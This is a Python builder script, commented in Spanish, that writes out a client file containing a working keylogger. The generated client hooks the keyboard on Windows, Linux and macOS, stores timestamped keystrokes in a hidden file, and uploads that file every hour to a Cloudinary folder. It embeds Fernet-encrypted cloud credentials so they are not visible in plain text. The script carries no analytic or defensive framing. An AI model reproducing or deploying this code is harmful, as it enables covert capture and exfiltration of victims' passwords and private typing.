import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet


load_dotenv()


# Genera una clave de encriptación aleatoria
key = Fernet.generate_key()

# Crea un objeto Fernet con la clave generada
cipher_suite = Fernet(key)

# Ruta relativa del archivo
ruta_relativa = 'createClient/cliente.py'

# Obtener la ruta absoluta del archivo
ruta_absoluta = os.path.abspath(ruta_relativa)


# Contenido del archivo
contenido = """
import platform
import datetime
import cloudinary.uploader
import threading
import ctypes


def absolute_path():
    route_content = os.getcwd()
    return route_content

def set_hidden_attribute(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
    except:
        print("")

def on_key_press(key, system):
    if system == 'Linux' or system == 'Darwin':
        route = absolute_path() + '/.upload_content.txt'
    elif system == 'Windows':
        route = absolute_path() + '/upload_content.txt'
        set_hidden_attribute(route)

    file_keys = route
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if hasattr(key, 'char'):
        key_char = key.char
    else:
        key_char = str(key)
    with open(file_keys, "a") as f:
        
        f.write(f'{now} - {key_char}\\n')

def on_key_release(key):
    # liberar teclado
    pass

def invocate_keylogger():
    system = platform.system()

    if system == 'Linux' or system == 'Darwin':
        import pyxhook

        def on_key_event(event, system):
            if event.Ascii != 0:
                on_key_press(event.Key, system)

        hookman = pyxhook.HookManager()
        hookman.KeyDown = lambda event: on_key_event(event, system)
        hookman.HookKeyboard()
        hookman.start()

    elif system == 'Windows':
        from pynput.keyboard import Listener
        with Listener(on_press=lambda key: on_key_press(key, system),
                      on_release=on_key_release) as listener:
            listener.join()

    else:
        print("Sistema operativo no compatible.")
        

def upload_to_cloudinary(system):
    folder_name = 'PruebaKey'
    if system == 'Linux' or system == 'Darwin':
        file_path = absolute_path() + '/.upload_content.txt'
    elif system == 'Windows':
        file_path = absolute_path() + '/upload_content.txt'

    try:
        cloudinary.uploader.upload(file_path, folder=folder_name, resource_type="auto")
    except:
        if not os.path.isfile(file_path) or os.stat(file_path).st_size == 0:
            print("pronto se creara el archivo TXT ...")

def cloudinary_upload_interval(interval):
    system = platform.system()
    while True:
        upload_to_cloudinary(system)
        # Esperar el intervalo de tiempo especificado antes de la proxima subida
        threading.Event().wait(interval)

def main():
    decrypt_content()
    cloudinary_thread = threading.Thread(target=cloudinary_upload_interval, args=(3600,))
    cloudinary_thread.start()

    invocate_keylogger()

if __name__ == '__main__':
    main()


"""

# encryptación de credenciales 

# Cifra las credenciales
encrypted_cloud_name = cipher_suite.encrypt(os.getenv('CLOUDINARY_CLOUD_NAME').encode())
encrypted_api_key = cipher_suite.encrypt(os.getenv('CLOUDINARY_API_KEY').encode())
encrypted_api_secret = cipher_suite.encrypt(os.getenv('CLOUDINARY_API_SECRET').encode())





pwd = os.getcwd()
path_directory = pwd + '/createClient/internal_data.txt'

with open(path_directory, "wb") as archivo_clave:
    archivo_clave.write(key)


# Texto que quieres agregar al principio del archivo
text_to_add = f"""
import os
import cloudinary
from cryptography.fernet import Fernet

# Desencripta las credenciales
cloud_name_cifrado = {encrypted_cloud_name}
api_key_cifrado = {encrypted_api_key}
api_secret_cifrado = {encrypted_api_secret}


def decrypt_content():
    routh_file = os.getcwd() + '/internal_data.txt'
    with open(routh_file, "rb") as archivo_clave:
        key = archivo_clave.read()

    cipher_suite = Fernet(key)
    cloud_name = cipher_suite.decrypt(cloud_name_cifrado).decode()
    api_key = cipher_suite.decrypt(api_key_cifrado).decode()
    api_secret = cipher_suite.decrypt(api_secret_cifrado).decode()

    # Configura Cloudinary
    cloudinary.config(
        cloud_name=cloud_name,
        api_key=api_key,
        api_secret=api_secret
    )


""" 




# Crear y escribir en el archivo
try:
    with open(ruta_absoluta, "w") as archivo:
        archivo.write(text_to_add)
        archivo.write("\n")
        archivo.write(contenido)
        print('Archivo creado exitosamente\n')
    # print(f"Archivo {ruta_absoluta} creado exitosamente.")
except FileNotFoundError:
    print('No se pudo crear el archivo')
    # print(f"No se pudo crear el archivo en la ruta {ruta_absoluta}. Asegúrate de que la ruta es correcta y que tienes permisos para escribir en esa ubicación.")